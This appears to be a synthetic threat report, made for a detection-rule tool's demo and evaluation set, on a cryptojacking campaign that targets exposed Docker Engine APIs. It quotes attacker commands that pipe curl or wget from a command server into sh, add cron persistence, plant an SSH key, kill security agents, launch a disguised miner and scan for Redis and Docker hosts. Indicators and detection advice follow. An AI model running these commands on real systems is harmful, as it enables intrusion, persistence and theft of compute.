# Opportunistic cryptomining via exposed Docker Engine APIs ("Mantis" campaign)

> Synthetic report written for RuleSmith's offline demo and evaluation set. It mirrors widely published public reporting on Linux cryptojacking botnets; names and infrastructure are fictional.

## Summary

Since late September 2026 an automated campaign has been scanning for Docker Engine APIs exposed on TCP/2375 without authentication. On success it starts a privileged container that mounts the host root filesystem, drops a shell script onto the host, installs a cron job for persistence, kills competing miners, deploys an XMRig build and uses the host to scan for further victims. We have named the campaign Mantis after the mutex-like lock file it creates.

## Initial access

The attacker's scanner issues `POST /containers/create` to the exposed API with an Alpine image and `"Binds": ["/:/host"]`, `"Privileged": true`. The container's entrypoint is:

```
sh -c "chroot /host sh -c 'curl -fsSL http://45.153.160[.]12/m/init.sh | sh'"
```

On hosts where `curl` is missing the script falls back to `wget -q -O- http://45.153.160[.]12/m/init.sh | sh`. The parent of the resulting `sh` process is `containerd-shim-runc-v2` or `dockerd`, which in the affected environments never otherwise spawned shells that download and pipe content.

## Host preparation

`init.sh` runs as root and performs the following in order:

```
setenforce 0
ulimit -n 65535
echo "nameserver 8.8.8.8" > /etc/resolv.conf
chattr -i /etc/ld.so.preload
sysctl -w vm.nr_hugepages=128
```

It then terminates competing miners and known security agents:

```
pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami
systemctl stop aliyun.service; systemctl disable aliyun.service
```

## Persistence

Persistence is achieved through cron. The script writes to the root crontab and to `/etc/cron.d`:

```
(crontab -l 2>/dev/null; echo "*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh") | crontab -
echo "*/15 * * * * root wget -q -O- http://45.153.160[.]12/m/init.sh | sh" > /etc/cron.d/mantis
```

It also adds an attacker-controlled SSH key to `/root/.ssh/authorized_keys` (`ssh-rsa AAAAB3...mantis@c2`) and sets the file immutable with `chattr +i`.

## Payload

The miner is downloaded to a hidden directory and started with a config fetched from the same server:

```
mkdir -p /tmp/.x; cd /tmp/.x
curl -fsSL http://45.153.160[.]12/m/x86_64 -o /tmp/.x/kthreadd
chmod +x /tmp/.x/kthreadd
nohup /tmp/.x/kthreadd -o pool.mantis-mine[.]cc:3333 -u 44AbCd...XyZ -k --tls --rig-id $(hostname) >/dev/null 2>&1 &
```

The binary name `kthreadd` imitates a kernel thread. Its command line contains the pool, wallet and `--rig-id` arguments characteristic of XMRig. CPU usage on infected hosts reached 100 percent and outbound TLS connections to `pool.mantis-mine[.]cc:3333` persisted for the lifetime of the process.

## Lateral movement and propagation

Infected hosts download `masscan` and scan /16 ranges for additional exposed Docker APIs and Redis servers:

```
/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt
```

Redis instances without authentication are abused by writing a cron entry through `CONFIG SET dir /var/spool/cron` and `CONFIG SET dbfilename root`.

## Indicators

| Type | Value |
|---|---|
| IP | 45.153.160[.]12 |
| Domain | pool.mantis-mine[.]cc |
| Path | /tmp/.x/kthreadd, /etc/cron.d/mantis |
| SHA256 (x86_64 miner) | 5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c |

## Recommendations

Never expose the Docker API without TLS and authentication. Alert on shells spawned by container runtimes that invoke `curl` or `wget` piped to `sh`, on cron entries whose command downloads and pipes content, on `chattr +i` applied to `authorized_keys`, on executables run from `/tmp/.x` or other hidden temp directories, and on processes whose command line contains mining-pool arguments such as `-o <host>:3333` with a wallet address.
